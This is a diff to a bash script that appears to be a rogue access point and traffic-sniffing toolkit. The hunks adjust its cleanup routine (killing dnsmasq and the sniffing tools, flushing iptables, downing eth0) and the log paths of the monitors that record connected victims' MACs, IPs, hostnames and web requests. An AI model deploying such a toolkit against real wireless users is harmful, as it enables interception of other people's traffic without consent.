@@ -162,7 +162,7 @@ fi; done
 if [ -f /var/run/dhcpd/at0.pid ]; then
 kill `cat /var/run/dhcpd/at0.pid 2>$LOG` &>/dev/null;
 fi
-killall -9 airodump-ng aireplay-ng wireshark mdk3 driftnet urlsnarf dsniff &>/dev/null
+killall -9 dnsmasq airodump-ng aireplay-ng wireshark mdk3 driftnet urlsnarf dsniff &>/dev/null
 iptables --flush
 iptables --table nat --flush
 iptables --table mangle --flush
@@ -171,6 +171,7 @@ iptables --delete-chain
 iptables --table nat --delete-chain
 iptables --table mangle --delete-chain
 echo "0" > /proc/sys/net/ipv4/ip_forward
+ifconfig eth0 down
 }
 function firewall(){
 iptables -P FORWARD ACCEPT
@@ -418,7 +419,7 @@ echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP:
 echo "awk '/DHCPACK/ && /at0/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
 echo "echo \$$ > $folder/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
-echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
+echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/access.log)" >> $folder/web.sh
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
@@ -429,7 +430,7 @@ gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
 #gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
-#"tail -f /var/log/apache2/error.log"
+#"tail -f $sessionfolder/error.log"
 }
 function deauth(){
 echo ""
